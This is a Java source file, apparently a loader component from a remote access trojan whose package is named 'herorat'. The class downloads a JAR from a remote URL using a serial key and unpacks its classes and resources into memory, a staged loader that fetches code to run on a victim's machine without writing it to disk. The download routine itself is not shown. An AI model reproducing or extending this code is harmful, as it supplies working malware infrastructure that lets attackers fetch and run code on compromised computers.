package net.herorat.loader;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

public class EncryptedLoader
{
	private String serial;
	private String url;
	
	private final Map<String, byte[]> classes;
	private final Map<String, byte[]> resources;

	public EncryptedLoader(String serial, String url)
	{
		this.serial = serial;
		this.url = url;
		this.classes = new HashMap<String, byte[]>();
		this.resources = new HashMap<String, byte[]>();
	}

	public void load()
	{
		try
		{
			System.out.println("in loader.load()");
			JarInputStream input = new JarInputStream( new ByteArrayInputStream(Download.go(this.serial, this.url)) );
			System.out.println("Got JarInputStream");
			byte[] classbytes;
			JarEntry entry;
			System.out.println("Looping JAR entries");
			while ((entry = input.getNextJarEntry()) != null)
			{
				
				String name = entry.getName();
				if(name.endsWith(".class"))
                {
//					System.out.println("ends with .class");
					name = name.substring(0, name.length() - 6).replace('/', '.');
					classbytes = getResourceData(input);
//					System.out.printf("\tFound: %s\n",name);
	                classes.put(name, classbytes);
                }
				else
				{
//					System.out.println("File not class");
					classbytes = getResourceData(input);
//					if (name.charAt(0) != '/')
					{
						name = "/" + name;
					}
//					System.out.printf("\tFound: %s\n",name);
					resources.put(name, classbytes);
				}
			}
			System.out.println("out of JAR loop");
		}
		catch (Exception e)
		{
			System.out.println("Exception loading jar");
			e.printStackTrace();
		}
	}

	public Map<String, byte[]> getClasses()
	{
		return classes;
	}
	
	public Map<String, byte[]> getResources()
	{
		return resources;
	}
	
	private byte[] getResourceData(JarInputStream jar)
	{
		try
		{
			ByteArrayOutputStream data = new ByteArrayOutputStream();
			byte[] buffer = new byte[8192];
			int size;
			while (jar.available() > 0)
			{
				size = jar.read(buffer);
				if (size > 0) data.write(buffer, 0, size);
			}
			
			return data.toByteArray();
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
		
		return null;
	}
}